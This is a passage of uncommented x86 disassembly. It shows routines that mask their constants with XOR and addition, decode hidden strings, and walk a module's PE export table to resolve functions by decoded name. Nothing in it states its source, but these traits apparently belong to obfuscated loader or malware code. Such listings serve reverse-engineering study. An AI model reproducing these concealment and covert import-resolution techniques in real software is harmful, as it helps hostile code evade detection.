  41f552:	xor    cx,bx
  41f555:	mov    ebx,0x4e22
  41f55a:	cmp    cx,bx
  41f55d:	jne    0x41f527
  41f55f:	cmp    DWORD PTR [ebp-0x4],0xf89c8586
  41f566:	pop    edi
  41f567:	pop    ebx
  41f568:	je     0x41f56f
  41f56a:	xor    eax,eax
  41f56c:	inc    eax
  41f56d:	jmp    0x41f571
  41f56f:	xor    eax,eax
  41f571:	pop    esi
  41f572:	leave  
  41f573:	ret    
  41f574:	push   ebp
  41f575:	mov    ebp,esp
  41f577:	push   ecx
  41f578:	mov    eax,DWORD PTR [ebp+0x8]
  41f57b:	movzx  ecx,WORD PTR [eax]
  41f57e:	push   esi
  41f57f:	lea    eax,[ecx-0x3b51]
  41f585:	mov    esi,0x8a8d
  41f58a:	push   edi
  41f58b:	xor    eax,esi
  41f58d:	mov    edi,0x4e22
  41f592:	mov    DWORD PTR [ebp-0x4],edx
  41f595:	cmp    ax,di
  41f598:	je     0x41f5c5
  41f59a:	mov    eax,DWORD PTR [ebp+0x8]
  41f59d:	sub    eax,edx
  41f59f:	mov    DWORD PTR [ebp+0x8],eax
  41f5a2:	jmp    0x41f5a7
  41f5a4:	mov    eax,DWORD PTR [ebp+0x8]
  41f5a7:	mov    WORD PTR [edx],cx
  41f5aa:	add    edx,0x2
  41f5ad:	movzx  edi,WORD PTR [eax+edx*1]
  41f5b1:	mov    ecx,edi
  41f5b3:	add    edi,0xffffc4af
  41f5b9:	xor    edi,esi
  41f5bb:	mov    eax,0x4e22
  41f5c0:	cmp    di,ax
  41f5c3:	jne    0x41f5a4
  41f5c5:	xor    eax,eax
  41f5c7:	pop    edi
  41f5c8:	mov    WORD PTR [edx],ax
  41f5cb:	mov    eax,DWORD PTR [ebp-0x4]
  41f5ce:	pop    esi
  41f5cf:	leave  
  41f5d0:	ret    0x4
  41f5d3:	push   ebp
  41f5d4:	mov    ebp,esp
  41f5d6:	sub    esp,0x18
  41f5d9:	mov    DWORD PTR [ebp-0x14],0xf89c8585
  41f5e0:	mov    DWORD PTR [ebp-0x18],0xf89c8584
  41f5e7:	mov    eax,DWORD PTR [ebp-0x14]
  41f5ea:	xor    eax,0x751089b
  41f5ef:	add    eax,0x3272e2
  41f5f4:	mov    DWORD PTR [ebp-0x8],eax
  41f5f7:	mov    DWORD PTR [ebp-0x10],0xf89c85bd
  41f5fe:	mov    DWORD PTR [ebp-0xc],0xf89c85b9
  41f605:	mov    DWORD PTR [ebp-0x4],0xf89c85bb
  41f60c:	mov    eax,DWORD PTR [ebp-0x14]
  41f60f:	xor    eax,0x751089b
  41f614:	mov    ecx,DWORD PTR [ebp-0x8]
  41f617:	lea    eax,[ecx+eax*1+0x3272e2]
  41f61e:	mov    ecx,DWORD PTR [ebp-0x18]
  41f621:	xor    ecx,0x751089b
  41f627:	add    ecx,0x3272e2
  41f62d:	mov    edx,DWORD PTR [ebp+0x10]
  41f630:	imul   edx,ecx
  41f633:	cmp    eax,edx
  41f635:	jae    0x41f728
  41f63b:	mov    eax,DWORD PTR [ebp+0x10]
  41f63e:	mov    ecx,DWORD PTR [ebp-0x8]
  41f641:	sub    eax,ecx
  41f643:	mov    ecx,DWORD PTR [ebp-0x10]
  41f646:	xor    ecx,0x751089b
  41f64c:	add    ecx,0x3272e2
  41f652:	cmp    eax,ecx
  41f654:	jbe    0x41f686
  41f656:	mov    eax,DWORD PTR [ebp+0x8]
  41f659:	add    eax,DWORD PTR [ebp-0x8]
  41f65c:	mov    ecx,DWORD PTR [ebp+0xc]
  41f65f:	add    ecx,DWORD PTR [ebp-0x8]
  41f662:	mov    edx,DWORD PTR [ecx]
  41f664:	mov    DWORD PTR [eax],edx
  41f666:	mov    ecx,DWORD PTR [ecx+0x4]
  41f669:	mov    DWORD PTR [eax+0x4],ecx
  41f66c:	mov    eax,DWORD PTR [ebp-0x10]
  41f66f:	xor    eax,0x751089b
  41f674:	mov    ecx,DWORD PTR [ebp-0x8]
  41f677:	lea    eax,[ecx+eax*1+0x3272e2]
  41f67e:	mov    DWORD PTR [ebp-0x8],eax
  41f681:	jmp    0x41f723
  41f686:	mov    eax,DWORD PTR [ebp+0x10]
  41f689:	mov    ecx,DWORD PTR [ebp-0x8]
  41f68c:	sub    eax,ecx
  41f68e:	mov    ecx,DWORD PTR [ebp-0xc]
  41f691:	xor    ecx,0x751089b
  41f697:	add    ecx,0x3272e2
  41f69d:	cmp    eax,ecx
  41f69f:	jbe    0x41f6c8
  41f6a1:	mov    eax,DWORD PTR [ebp+0x8]
  41f6a4:	add    eax,DWORD PTR [ebp-0x8]
  41f6a7:	mov    ecx,DWORD PTR [ebp+0xc]
  41f6aa:	add    ecx,DWORD PTR [ebp-0x8]
  41f6ad:	mov    ecx,DWORD PTR [ecx]
  41f6af:	mov    DWORD PTR [eax],ecx
  41f6b1:	mov    eax,DWORD PTR [ebp-0xc]
  41f6b4:	xor    eax,0x751089b
  41f6b9:	mov    ecx,DWORD PTR [ebp-0x8]
  41f6bc:	lea    eax,[ecx+eax*1+0x3272e2]
  41f6c3:	mov    DWORD PTR [ebp-0x8],eax
  41f6c6:	jmp    0x41f723
  41f6c8:	mov    eax,DWORD PTR [ebp+0x10]
  41f6cb:	mov    ecx,DWORD PTR [ebp-0x8]
  41f6ce:	sub    eax,ecx
  41f6d0:	mov    ecx,DWORD PTR [ebp-0x4]
  41f6d3:	xor    ecx,0x751089b
  41f6d9:	add    ecx,0x3272e2
  41f6df:	cmp    eax,ecx
  41f6e1:	jbe    0x41f70c
  41f6e3:	mov    eax,DWORD PTR [ebp+0x8]
  41f6e6:	add    eax,DWORD PTR [ebp-0x8]
  41f6e9:	mov    ecx,DWORD PTR [ebp+0xc]
  41f6ec:	add    ecx,DWORD PTR [ebp-0x8]
  41f6ef:	mov    cx,WORD PTR [ecx]
  41f6f2:	mov    WORD PTR [eax],cx
  41f6f5:	mov    eax,DWORD PTR [ebp-0x4]
  41f6f8:	xor    eax,0x751089b
  41f6fd:	mov    ecx,DWORD PTR [ebp-0x8]
  41f700:	lea    eax,[ecx+eax*1+0x3272e2]
  41f707:	mov    DWORD PTR [ebp-0x8],eax
  41f70a:	jmp    0x41f723
  41f70c:	mov    eax,DWORD PTR [ebp+0x8]
  41f70f:	add    eax,DWORD PTR [ebp-0x8]
  41f712:	mov    ecx,DWORD PTR [ebp+0xc]
  41f715:	add    ecx,DWORD PTR [ebp-0x8]
  41f718:	mov    cl,BYTE PTR [ecx]
  41f71a:	mov    BYTE PTR [eax],cl
  41f71c:	mov    eax,DWORD PTR [ebp-0x8]
  41f71f:	inc    eax
  41f720:	mov    DWORD PTR [ebp-0x8],eax
  41f723:	jmp    0x41f60c
  41f728:	leave  
  41f729:	ret    0xc
  41f72c:	push   ebp
  41f72d:	mov    ebp,esp
  41f72f:	sub    esp,0xc
  41f732:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  41f739:	push   esi
  41f73a:	mov    esi,eax
  41f73c:	mov    DWORD PTR [ebp-0x8],0xf89c8584
  41f743:	mov    edx,DWORD PTR [ebp-0x4]
  41f746:	mov    eax,0x751089b
  41f74b:	xor    edx,eax
  41f74d:	mov    ecx,0x3272e2
  41f752:	add    edx,ecx
  41f754:	cmp    esi,edx
  41f756:	je     0x41f798
  41f758:	push   ebx
  41f759:	push   edi
  41f75a:	mov    edx,DWORD PTR [ebp-0x8]
  41f75d:	mov    ebx,DWORD PTR [ebp+0x8]
  41f760:	xor    edx,eax
  41f762:	mov    edi,0xffcd8d1e
  41f767:	sub    edi,edx
  41f769:	add    esi,edi
  41f76b:	lea    edx,[esi-0x3272e2]
  41f771:	xor    edx,eax
  41f773:	mov    DWORD PTR [ebp-0xc],edx
  41f776:	mov    edx,DWORD PTR [ebp-0x4]
  41f779:	mov    edi,DWORD PTR [ebp-0xc]
  41f77c:	xor    dl,0x9b
  41f77f:	sub    dl,0x1e
  41f782:	xor    edi,eax
  41f784:	mov    BYTE PTR [edi+ebx*1+0x3272e2],dl
  41f78b:	mov    edx,DWORD PTR [ebp-0x4]
  41f78e:	xor    edx,eax
  41f790:	add    edx,ecx
  41f792:	cmp    esi,edx
  41f794:	jne    0x41f75a
  41f796:	pop    edi
  41f797:	pop    ebx
  41f798:	pop    esi
  41f799:	leave  
  41f79a:	ret    0x4
  41f79d:	push   ebp
  41f79e:	mov    ebp,esp
  41f7a0:	sub    esp,0x21c
  41f7a6:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  41f7ad:	mov    DWORD PTR [ebp-0x14],0xf89c8584
  41f7b4:	mov    eax,DWORD PTR [ebp+0x10]
  41f7b7:	mov    eax,DWORD PTR [ebp-0x4]
  41f7ba:	mov    ecx,DWORD PTR [ebp+0x8]
  41f7bd:	push   esi
  41f7be:	push   edi
  41f7bf:	mov    edi,0x751089b
  41f7c4:	xor    eax,edi
  41f7c6:	mov    esi,0x3272e2
  41f7cb:	add    eax,esi
  41f7cd:	cmp    eax,ecx
  41f7cf:	mov    eax,DWORD PTR [ebp-0x4]
  41f7d2:	jne    0x41f7dd
  41f7d4:	xor    eax,edi
  41f7d6:	add    eax,esi
  41f7d8:	jmp    0x41f889
  41f7dd:	mov    ecx,DWORD PTR [ebp+0xc]
  41f7e0:	xor    eax,edi
  41f7e2:	add    eax,esi
  41f7e4:	cmp    eax,ecx
  41f7e6:	jne    0x41f7ed
  41f7e8:	mov    eax,DWORD PTR [ebp-0x4]
  41f7eb:	jmp    0x41f7d4
  41f7ed:	lea    eax,[ebp-0x21c]
  41f7f3:	mov    DWORD PTR [ebp-0x8],eax
  41f7f6:	mov    eax,DWORD PTR [ebp+0xc]
  41f7f9:	mov    DWORD PTR [ebp-0x10],eax
  41f7fc:	mov    eax,DWORD PTR [ebp-0x4]
  41f7ff:	xor    eax,edi
  41f801:	add    eax,esi
  41f803:	mov    DWORD PTR [ebp+0x10],eax
  41f806:	mov    eax,DWORD PTR [ebp+0xc]
  41f809:	push   ebx
  41f80a:	call   0x41f4e5
  41f80f:	mov    ebx,eax
  41f811:	mov    eax,DWORD PTR [ebp+0x8]
  41f814:	mov    eax,DWORD PTR [eax+0x14]
  41f817:	jmp    0x41f871
  41f819:	mov    eax,DWORD PTR [ebp+0xc]
  41f81c:	sub    eax,0x8
  41f81f:	mov    DWORD PTR [ebp-0xc],eax
  41f822:	mov    eax,DWORD PTR [ebp-0xc]
  41f825:	mov    eax,DWORD PTR [eax+0x28]
  41f828:	call   0x41f3cd
  41f82d:	mov    DWORD PTR [ebp+0x10],eax
  41f830:	push   DWORD PTR [ebp+0x10]
  41f833:	mov    edx,DWORD PTR [ebp-0x8]
  41f836:	call   0x41f574
  41f83b:	mov    eax,DWORD PTR [ebp-0x4]
  41f83e:	xor    eax,edi
  41f840:	add    eax,esi
  41f842:	cmp    eax,ebx
  41f844:	jne    0x41f84e
  41f846:	mov    eax,DWORD PTR [ebp-0x8]
  41f849:	call   0x41f45b
  41f84e:	mov    eax,DWORD PTR [ebp-0x14]
  41f851:	xor    eax,edi
  41f853:	add    eax,esi
  41f855:	push   eax
  41f856:	push   DWORD PTR [ebp-0x10]
  41f859:	mov    eax,DWORD PTR [ebp-0x8]
  41f85c:	call   0x41f187
  41f861:	mov    ecx,DWORD PTR [ebp-0x4]
  41f864:	xor    ecx,edi
  41f866:	add    ecx,esi
  41f868:	cmp    eax,ecx
  41f86a:	je     0x41f88f
  41f86c:	mov    eax,DWORD PTR [ebp+0xc]
  41f86f:	mov    eax,DWORD PTR [eax]
  41f871:	mov    DWORD PTR [ebp+0xc],eax
  41f874:	mov    eax,DWORD PTR [ebp+0x8]
  41f877:	mov    ecx,DWORD PTR [ebp+0xc]
  41f87a:	add    eax,0x14
  41f87d:	cmp    ecx,eax
  41f87f:	jne    0x41f819
  41f881:	mov    eax,DWORD PTR [ebp-0x4]
  41f884:	xor    eax,edi
  41f886:	add    eax,esi
  41f888:	pop    ebx
  41f889:	pop    edi
  41f88a:	pop    esi
  41f88b:	leave  
  41f88c:	ret    0xc
  41f88f:	mov    eax,DWORD PTR [ebp-0xc]
  41f892:	mov    eax,DWORD PTR [eax+0x18]
  41f895:	jmp    0x41f888
  41f897:	push   ebp
  41f898:	mov    ebp,esp
  41f89a:	mov    eax,DWORD PTR [ebp+0xc]
  41f89d:	sub    esp,0x10
  41f8a0:	cmp    DWORD PTR [ebp+0x8],0x0
  41f8a4:	push   ebx
  41f8a5:	push   esi
  41f8a6:	push   edi
  41f8a7:	je     0x41f95c
  41f8ad:	test   eax,eax
  41f8af:	je     0x41f95c
  41f8b5:	movzx  eax,WORD PTR [eax+0x20]
  41f8b9:	mov    ecx,eax
  41f8bb:	mov    DWORD PTR [ebp-0x10],eax
  41f8be:	xor    edx,edx
  41f8c0:	and    DWORD PTR [ebp-0x8],edx
  41f8c3:	mov    eax,0x8a8d
  41f8c8:	xor    ecx,eax
  41f8ca:	add    ecx,0x3b51
  41f8d0:	mov    DWORD PTR [ebp-0xc],ecx
  41f8d3:	and    DWORD PTR [ebp-0x4],0x0
  41f8d7:	xor    ecx,ecx
  41f8d9:	push   0x7e
  41f8db:	pop    edi
  41f8dc:	cmp    cx,WORD PTR [ebp-0xc]
  41f8e0:	jae    0x41f946
  41f8e2:	lea    esi,[edx-0x3b51]
  41f8e8:	xor    esi,eax
  41f8ea:	movzx  ecx,WORD PTR [ebp-0x4]
  41f8ee:	mov    ebx,DWORD PTR [ebp+0xc]
  41f8f1:	lea    ecx,[ebx+ecx*4]
  41f8f4:	cmp    WORD PTR [ecx+0x2],si
  41f8f8:	jne    0x41f931
  41f8fa:	movzx  ecx,WORD PTR [ecx]
  41f8fd:	mov    edi,0x4e22
  41f902:	cmp    cx,di
  41f905:	jne    0x41f913
  41f907:	mov    ebx,DWORD PTR [ebp+0x8]
  41f90a:	movzx  edi,dx
  41f90d:	cmp    BYTE PTR [edi+ebx*1],0x0
  41f911:	je     0x41f940
  41f913:	mov    ebx,DWORD PTR [ebp+0x8]
  41f916:	movzx  edi,dx
  41f919:	movsx  di,BYTE PTR [edi+ebx*1]
  41f91e:	mov    ebx,0x3b51
  41f923:	sub    di,bx
  41f926:	xor    di,ax
  41f929:	cmp    cx,di
  41f92c:	je     0x41f940
  41f92e:	push   0x7c
  41f930:	pop    edi
  41f931:	inc    DWORD PTR [ebp-0x4]
  41f934:	mov    cx,WORD PTR [ebp-0xc]
  41f938:	cmp    WORD PTR [ebp-0x4],cx
  41f93c:	jb     0x41f8ea
  41f93e:	jmp    0x41f946
  41f940:	inc    DWORD PTR [ebp-0x8]
  41f943:	push   0x7d
  41f945:	pop    edi
  41f946:	mov    esi,DWORD PTR [ebp+0x8]
  41f949:	movzx  ecx,dx
  41f94c:	cmp    BYTE PTR [ecx+esi*1],0x0
  41f950:	je     0x41f965
  41f952:	inc    edx
  41f953:	cmp    edi,0x7c
  41f956:	jne    0x41f8d3
  41f95c:	xor    eax,eax
  41f95e:	pop    edi
  41f95f:	pop    esi
  41f960:	pop    ebx
  41f961:	leave  
  41f962:	ret    0x8
  41f965:	mov    ecx,DWORD PTR [ebp-0x8]
  41f968:	add    ecx,0xffffc4af
  41f96e:	xor    cx,ax
  41f971:	xor    eax,eax
  41f973:	cmp    cx,WORD PTR [ebp-0x10]
  41f977:	sete   al
  41f97a:	jmp    0x41f95e
  41f97c:	push   ebp
  41f97d:	mov    ebp,esp
  41f97f:	sub    esp,0x50
  41f982:	push   edi
  41f983:	mov    edi,eax
  41f985:	mov    eax,DWORD PTR [edi+0x1a8]
  41f98b:	cmp    DWORD PTR [eax],0x0
  41f98e:	jne    0x41f997
  41f990:	xor    eax,eax
  41f992:	jmp    0x41fac8
  41f997:	push   DWORD PTR [ebp+0x8]
  41f99a:	push   0x2c
  41f99c:	pop    eax
  41f99d:	call   0x41f72c
  41f9a2:	mov    edx,DWORD PTR [edi+0x1ac]
  41f9a8:	lea    eax,[edi+0x22]
  41f9ab:	mov    DWORD PTR [ebp-0x4c],eax
  41f9ae:	lea    eax,[edi+0x44]
  41f9b1:	mov    DWORD PTR [ebp-0x48],eax
  41f9b4:	lea    eax,[edi+0x66]
  41f9b7:	mov    DWORD PTR [ebp-0x44],eax
  41f9ba:	lea    eax,[edi+0x88]
  41f9c0:	mov    DWORD PTR [ebp-0x40],eax
  41f9c3:	lea    eax,[edi+0xaa]
  41f9c9:	mov    DWORD PTR [ebp-0x3c],eax
  41f9cc:	lea    eax,[edi+0xcc]
  41f9d2:	mov    DWORD PTR [ebp-0x38],eax
  41f9d5:	lea    eax,[edi+0xee]
  41f9db:	mov    DWORD PTR [ebp-0x34],eax
  41f9de:	lea    eax,[edi+0x110]
  41f9e4:	mov    DWORD PTR [ebp-0x30],eax
  41f9e7:	lea    eax,[edi+0x132]
  41f9ed:	mov    DWORD PTR [ebp-0x2c],eax
  41f9f0:	lea    eax,[edi+0x154]
  41f9f6:	push   edi
  41f9f7:	mov    DWORD PTR [ebp-0x50],edi
  41f9fa:	mov    DWORD PTR [ebp-0x28],eax
  41f9fd:	call   0x41fafc
  41fa02:	push   eax
  41fa03:	mov    eax,DWORD PTR [edi+0x1a8]
  41fa09:	push   DWORD PTR [eax]
  41fa0b:	call   0x41f79d
  41fa10:	mov    DWORD PTR [ebp-0x10],eax
  41fa13:	test   eax,eax
  41fa15:	je     0x41fac8
  41fa1b:	mov    ecx,DWORD PTR [eax+0x3c]
  41fa1e:	push   ebx
  41fa1f:	push   esi
  41fa20:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  41fa24:	add    esi,eax
  41fa26:	mov    edi,DWORD PTR [esi+0x24]
  41fa29:	mov    ecx,DWORD PTR [esi+0x1c]
  41fa2c:	mov    edx,DWORD PTR [esi+0x20]
  41fa2f:	mov    ebx,DWORD PTR [esi+0x18]
  41fa32:	add    edi,eax
  41fa34:	mov    DWORD PTR [ebp-0x20],edi
  41fa37:	mov    edi,DWORD PTR [esi+0x14]
  41fa3a:	add    ecx,eax
  41fa3c:	add    edx,eax
  41fa3e:	mov    DWORD PTR [ebp-0xc],ecx
  41fa41:	mov    DWORD PTR [ebp-0x1c],edx
  41fa44:	mov    DWORD PTR [ebp-0x8],edi
  41fa47:	cmp    edi,ebx
  41fa49:	ja     0x41fa4e
  41fa4b:	mov    DWORD PTR [ebp-0x8],ebx
  41fa4e:	xor    ebx,ebx
  41fa50:	mov    DWORD PTR [ebp-0x18],ebx
  41fa53:	cmp    DWORD PTR [ebp-0x8],ebx
  41fa56:	jbe    0x41fac6
  41fa58:	jmp    0x41fa5d
  41fa5a:	mov    edx,DWORD PTR [ebp-0x1c]
  41fa5d:	mov    edi,DWORD PTR [ebp-0x20]
  41fa60:	movzx  edi,WORD PTR [edi+ebx*2]
  41fa64:	cmp    ebx,DWORD PTR [esi+0x18]
  41fa67:	jae    0x41fac6
  41fa69:	cmp    edi,DWORD PTR [esi+0x14]
  41fa6c:	jae    0x41fac6
  41fa6e:	mov    ebx,DWORD PTR [edx+ebx*4]
  41fa71:	mov    edx,DWORD PTR [ebp+0x8]
  41fa74:	mov    edi,DWORD PTR [ecx+edi*4]
  41fa77:	mov    DWORD PTR [ebp-0x4],edx
  41fa7a:	lea    edx,[ebp-0x50]
  41fa7d:	add    ebx,eax
  41fa7f:	add    edi,eax
  41fa81:	sub    edx,DWORD PTR [ebp+0x8]
  41fa84:	mov    DWORD PTR [ebp-0x14],0xb
  41fa8b:	mov    DWORD PTR [ebp-0x24],edx
  41fa8e:	mov    edx,DWORD PTR [ebp-0x4]
  41fa91:	cmp    DWORD PTR [edx],0x0
  41fa94:	jne    0x41fab1
  41fa96:	mov    eax,DWORD PTR [ebp-0x24]
  41fa99:	push   DWORD PTR [eax+edx*1]
  41fa9c:	push   ebx
  41fa9d:	call   0x41f897
  41faa2:	mov    ecx,DWORD PTR [ebp-0xc]
  41faa5:	test   eax,eax
  41faa7:	je     0x41faae
  41faa9:	mov    eax,DWORD PTR [ebp-0x4]
  41faac:	mov    DWORD PTR [eax],edi
  41faae:	mov    eax,DWORD PTR [ebp-0x10]
  41fab1:	add    DWORD PTR [ebp-0x4],0x4
  41fab5:	dec    DWORD PTR [ebp-0x14]
  41fab8:	jne    0x41fa8e
  41faba:	mov    ebx,DWORD PTR [ebp-0x18]
  41fabd:	inc    ebx
  41fabe:	mov    DWORD PTR [ebp-0x18],ebx
  41fac1:	cmp    ebx,DWORD PTR [ebp-0x8]
  41fac4:	jb     0x41fa5a
  41fac6:	pop    esi
  41fac7:	pop    ebx
  41fac8:	pop    edi
  41fac9:	leave  
  41faca:	ret    0x4
  41facd:	push   ebp
  41face:	mov    ebp,esp
  41fad0:	mov    eax,DWORD PTR [ebp+0x8]
  41fad3:	push   esi
  41fad4:	push   DWORD PTR [eax+0x1d8]
  41fada:	lea    esi,[eax+0x198]
  41fae0:	mov    eax,DWORD PTR [ebp+0x8]
  41fae3:	call   0x41f97c
  41fae8:	mov    ecx,DWORD PTR [esi]
  41faea:	mov    DWORD PTR [ecx],eax
  41faec:	mov    eax,DWORD PTR [esi]
  41faee:	xor    ecx,ecx
  41faf0:	cmp    DWORD PTR [eax],ecx
  41faf2:	pop    esi
  41faf3:	setne  cl
  41faf6:	mov    eax,ecx
  41faf8:	pop    ebp
  41faf9:	ret    0x4
  41fafc:	mov    ecx,DWORD PTR [edi+0x188]
  41fb02:	push   ebx
  41fb03:	jmp    0x41fb18
  41fb05:	xor    eax,0x8a8d
  41fb0a:	add    eax,0x3b51
  41fb0f:	mov    WORD PTR [ecx],ax
  41fb12:	add    ecx,0x2
  41fb15:	add    edx,0x2
  41fb18:	movzx  eax,WORD PTR [edx]
  41fb1b:	mov    ebx,0x4e22
  41fb20:	cmp    ax,bx
  41fb23:	jne    0x41fb05
  41fb25:	xor    eax,eax
  41fb27:	mov    WORD PTR [ecx],ax
  41fb2a:	mov    eax,DWORD PTR [edi+0x188]
  41fb30:	pop    ebx
  41fb31:	ret    
  41fb32:	push   edi
  41fb33:	mov    edi,eax
  41fb35:	mov    eax,DWORD PTR [esi+0x188]
  41fb3b:	shl    edi,0x6
  41fb3e:	add    eax,edi
  41fb40:	jmp    0x41fb4c
  41fb42:	xor    cl,0x74
  41fb45:	sub    cl,0x8
  41fb48:	mov    BYTE PTR [eax],cl
  41fb4a:	inc    eax
  41fb4b:	inc    edx
  41fb4c:	mov    cl,BYTE PTR [edx]
  41fb4e:	cmp    cl,0x7c
  41fb51:	jne    0x41fb42
  41fb53:	mov    BYTE PTR [eax],0x0
  41fb56:	mov    eax,DWORD PTR [esi+0x188]
  41fb5c:	add    eax,edi
  41fb5e:	pop    edi
  41fb5f:	ret    
  41fb60:	push   ebp
  41fb61:	mov    ebp,esp
  41fb63:	sub    esp,0x38
  41fb66:	push   ebx
  41fb67:	mov    ebx,0xf89c8585
  41fb6c:	mov    DWORD PTR [ebp-0x4],ebx
  41fb6f:	lea    eax,[ebx-0x1]
  41fb72:	push   esi
  41fb73:	mov    DWORD PTR [ebp-0x24],eax
  41fb76:	mov    ecx,DWORD PTR [ebp-0x4]
  41fb79:	mov    edx,DWORD PTR [ebp+0x8]
  41fb7c:	mov    esi,0x751089b
  41fb81:	push   edi
  41fb82:	xor    ecx,esi
  41fb84:	mov    edi,0x3272e2
  41fb89:	add    ecx,edi
  41fb8b:	cmp    edx,ecx
  41fb8d:	je     0x41fcfb
  41fb93:	mov    ecx,DWORD PTR [ebp-0x4]
  41fb96:	mov    edx,DWORD PTR [ebp+0xc]
  41fb99:	xor    ecx,esi
  41fb9b:	add    ecx,edi
  41fb9d:	cmp    edx,ecx
  41fb9f:	je     0x41fcfb
  41fba5:	mov    ecx,DWORD PTR [ebp+0x10]
  41fba8:	mov    DWORD PTR [ebp-0x18],ecx
  41fbab:	mov    ecx,DWORD PTR [ebp+0xc]
  41fbae:	mov    DWORD PTR [ebp-0x14],ecx
  41fbb1:	mov    ecx,DWORD PTR [ebp+0x8]
  41fbb4:	mov    DWORD PTR [ebp-0x1c],0xf89c8507
  41fbbb:	mov    DWORD PTR [ebp-0x20],eax
  41fbbe:	mov    DWORD PTR [ebp-0x10],ebx
  41fbc1:	mov    DWORD PTR [ebp+0xc],eax
  41fbc4:	mov    DWORD PTR [ebp+0x10],0xf89c85bb
  41fbcb:	mov    eax,DWORD PTR [ebp+0xc]
  41fbce:	mov    DWORD PTR [ebp-0xc],ecx
  41fbd1:	xor    eax,esi
  41fbd3:	mov    ecx,0xffcd8d1e
  41fbd8:	sub    ecx,eax
  41fbda:	add    ecx,DWORD PTR [ebp-0x14]
  41fbdd:	mov    DWORD PTR [ebp+0x8],ecx
  41fbe0:	mov    DWORD PTR [ebp-0x8],0xf89c85b8
  41fbe7:	jmp    0x41fceb
  41fbec:	mov    eax,DWORD PTR [ebp+0xc]
  41fbef:	mov    ecx,DWORD PTR [ebp+0xc]
  41fbf2:	xor    eax,esi
  41fbf4:	xor    ecx,esi
  41fbf6:	lea    ecx,[eax+ecx*1+0x64e5c4]
  41fbfd:	mov    eax,DWORD PTR [ebp+0x8]
  41fc00:	xor    edx,edx
  41fc02:	div    ecx
  41fc04:	mov    eax,DWORD PTR [ebp+0x10]
  41fc07:	mov    ecx,DWORD PTR [ebp+0xc]
  41fc0a:	xor    eax,esi
  41fc0c:	xor    ecx,esi
  41fc0e:	sub    eax,ecx
  41fc10:	cmp    edx,eax
  41fc12:	jne    0x41fca7
  41fc18:	mov    eax,DWORD PTR [ebp+0x8]
  41fc1b:	add    eax,DWORD PTR [ebp-0xc]
  41fc1e:	mov    dl,BYTE PTR [eax]
  41fc20:	mov    eax,DWORD PTR [ebp-0x10]
  41fc23:	mov    ecx,DWORD PTR [ebp-0x8]
  41fc26:	xor    eax,esi
  41fc28:	xor    ecx,esi
  41fc2a:	add    eax,edi
  41fc2c:	add    ecx,edi
  41fc2e:	cmp    eax,ecx
  41fc30:	jae    0x41fc78
  41fc32:	lea    ecx,[eax-0x3272e2]
  41fc38:	mov    DWORD PTR [ebp-0x4],ecx
  41fc3b:	mov    ebx,DWORD PTR [ebp-0x4]
  41fc3e:	xor    ebx,esi
  41fc40:	add    ebx,0x7f55d8fb
  41fc46:	lea    ecx,[ebp+eax*4-0x38]
  41fc4a:	mov    DWORD PTR [ecx],ebx
  41fc4c:	mov    ebx,DWORD PTR [ecx]
  41fc4e:	cmp    ebx,0x244ecbda
  41fc54:	jbe    0x41fc5e
  41fc56:	add    DWORD PTR [ecx],0x405fc19
  41fc5c:	jmp    0x41fc64
  41fc5e:	add    DWORD PTR [ecx],0xfdaf43e7
  41fc64:	mov    ecx,DWORD PTR [ebp-0x8]
  41fc67:	xor    ecx,esi
  41fc69:	inc    eax
  41fc6a:	inc    DWORD PTR [ebp-0x4]
  41fc6d:	add    ecx,edi
  41fc6f:	cmp    eax,ecx
  41fc71:	jb     0x41fc3b
  41fc73:	mov    ebx,0xf89c8585
  41fc78:	mov    eax,DWORD PTR [ebp-0x18]
  41fc7b:	test   eax,eax
  41fc7d:	jne    0x41fc87
  41fc7f:	xor    dl,0x74
  41fc82:	sub    dl,0x8
  41fc85:	jmp    0x41fc9d
  41fc87:	mov    eax,DWORD PTR [ebp-0x1c]
  41fc8a:	xor    al,0x9b
  41fc8c:	mov    cl,0x1e
  41fc8e:	sub    cl,al
  41fc90:	add    dl,cl
  41fc92:	mov    ecx,DWORD PTR [ebp-0x20]
  41fc95:	xor    cl,0x9b
  41fc98:	sub    cl,0x1e
  41fc9b:	ror    dl,cl
  41fc9d:	xor    eax,eax
  41fc9f:	mov    eax,DWORD PTR [ebp+0x8]
  41fca2:	add    eax,DWORD PTR [ebp-0xc]
  41fca5:	mov    BYTE PTR [eax],dl
  41fca7:	mov    eax,DWORD PTR [ebp+0x8]
  41fcaa:	mov    ecx,DWORD PTR [ebp-0x10]
  41fcad:	sub    eax,edi
  41fcaf:	xor    eax,esi
  41fcb1:	cmp    eax,ecx
  41fcb3:	jne    0x41fcd9
  41fcb5:	mov    eax,DWORD PTR [ebp+0x10]
  41fcb8:	mov    ecx,DWORD PTR [ebp+0xc]
  41fcbb:	xor    eax,esi
  41fcbd:	xor    ecx,esi
  41fcbf:	sub    eax,ecx
  41fcc1:	sub    eax,edi
  41fcc3:	xor    eax,esi
  41fcc5:	mov    DWORD PTR [ebp+0x10],eax
  41fcc8:	mov    eax,DWORD PTR [ebp+0xc]
  41fccb:	xor    eax,esi
  41fccd:	mov    ecx,0xffcd8d1e
  41fcd2:	sub    ecx,eax
  41fcd4:	add    ecx,DWORD PTR [ebp-0x14]
  41fcd7:	jmp    0x41fce8
  41fcd9:	mov    eax,DWORD PTR [ebp+0xc]
  41fcdc:	xor    eax,esi
  41fcde:	mov    ecx,0xffcd8d1e
  41fce3:	sub    ecx,eax
  41fce5:	add    ecx,DWORD PTR [ebp+0x8]
  41fce8:	mov    DWORD PTR [ebp+0x8],ecx
  41fceb:	mov    eax,DWORD PTR [ebp+0x10]
  41fcee:	cmp    eax,ebx
  41fcf0:	jne    0x41fbec
  41fcf6:	mov    eax,DWORD PTR [ebp-0x24]
  41fcf9:	jmp    0x41fcfe
  41fcfb:	mov    eax,DWORD PTR [ebp-0x4]
  41fcfe:	xor    eax,esi
  41fd00:	add    eax,edi
  41fd02:	pop    edi
  41fd03:	pop    esi
  41fd04:	pop    ebx
  41fd05:	leave  
  41fd06:	ret    0xc
  41fd09:	push   ebp
  41fd0a:	mov    ebp,esp
  41fd0c:	sub    esp,0x14
  41fd0f:	mov    DWORD PTR [ebp-0x10],0xf89c8585
  41fd16:	mov    DWORD PTR [ebp-0x4],0xf89c8584
  41fd1d:	mov    eax,DWORD PTR [ebx]
  41fd1f:	mov    DWORD PTR [ebp-0x8],eax
  41fd22:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  41fd29:	push   esi
